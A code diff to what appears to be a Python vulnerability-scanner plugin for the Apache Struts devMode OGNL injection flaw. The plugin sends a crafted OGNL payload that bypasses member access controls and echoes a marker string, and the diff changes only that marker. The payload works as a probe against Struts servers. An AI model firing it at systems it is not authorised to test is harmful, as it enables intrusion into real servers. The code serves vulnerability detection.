@@ -28,7 +28,7 @@ class P(T):
         result['result']=False
         res=None
         # debug=browser&object=(#mem=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?#context[#parameters.rpsobj[0]].getWriter().println(#parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789
-        payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789"
+        payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=structs123456789"
 
         try:
             headers = {"Content-Type":"application/x-www-form-urlencoded"}
@@ -43,7 +43,7 @@ class P(T):
                 res.close()
                 del res
 
-        if res_html.find("123456789") <> -1:
+        if res_html.find("structs123456789") <> -1:
             cprint(target_url + '存在structsdevmode漏洞', 'red')
             info = target_url + "strutsdevmode  Vul"
             result['result']=True
